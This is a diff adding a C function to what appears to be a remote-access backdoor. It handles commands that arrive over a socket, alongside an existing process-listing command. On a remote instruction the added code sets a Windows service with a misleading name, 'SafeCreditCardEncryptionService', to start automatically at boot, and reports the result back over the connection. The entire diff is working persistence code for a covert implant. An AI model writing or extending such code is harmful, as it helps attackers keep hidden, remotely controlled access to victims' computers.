@@ -236,3 +236,78 @@ BOOL ListProcsCommand(SOCKET* sock) {
 
 	return TRUE;
 }
+
+BOOL BootStartCfgCommand(SOCKET* sock, PSTR str) {
+	if(!strlen(str))
+		return FALSE;
+
+	SC_HANDLE systemScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+	if(systemScm == FALSE) {
+		WriteConnection(sock, "Failed to open the service control manager!");
+		return TRUE;
+	}
+
+	SC_HANDLE thisService = OpenService(systemScm, "SafeCreditCardEncryptionService", SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG);
+	if(thisService == FALSE) {
+		CloseServiceHandle(systemScm);
+		WriteConnection(sock, "Failed to open service!");
+		return TRUE;
+	}
+
+	DWORD flag = SERVICE_DEMAND_START;
+	if(!strcmp(str, "true") || !strcmp(str,"1")) {
+		WriteConnection(sock, "enabling AutoStart");
+		flag = SERVICE_AUTO_START;
+	}
+
+	LPQUERY_SERVICE_CONFIGA currentConfig;
+	DWORD bytesNeeded;
+
+	BOOL gotConfig = FALSE;
+	if(!QueryServiceConfigA(thisService, NULL, 0, &bytesNeeded)) {
+		if(GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+			if(!processHeap)
+				processHeap = GetProcessHeap();
+
+			currentConfig = HeapAlloc(processHeap, HEAP_GENERATE_EXCEPTIONS |
+													HEAP_ZERO_MEMORY,
+													bytesNeeded);
+			gotConfig = QueryServiceConfigA(thisService, currentConfig, bytesNeeded, &bytesNeeded);
+		} else {
+			CloseServiceHandle(thisService);
+			CloseServiceHandle(systemScm);
+			WriteConnection(sock, "unable to get current configuration for service");
+			return TRUE;
+		}
+	}
+
+	//lol that ugly code
+	if(!gotConfig) {
+			CloseServiceHandle(thisService);
+			CloseServiceHandle(systemScm);
+			WriteConnection(sock, "unable to get current configuration for service");
+			return TRUE;
+	
+	}
+
+	if(!ChangeServiceConfigA(
+				thisService,
+				currentConfig->dwServiceType,
+				flag,
+				currentConfig->dwErrorControl,
+				currentConfig->lpBinaryPathName,
+				currentConfig->lpLoadOrderGroup,
+				NULL,
+				currentConfig->lpDependencies,
+				currentConfig->lpServiceStartName,
+				NULL, 
+				currentConfig->lpDisplayName))
+		WriteConnection(sock, "unable to change current configuration");
+	else 
+		WriteConnection(sock, "service configuration change (success)");
+
+	HeapFree(processHeap, 0x0, currentConfig);
+	CloseServiceHandle(thisService);
+	CloseServiceHandle(systemScm);
+	return TRUE;
+}
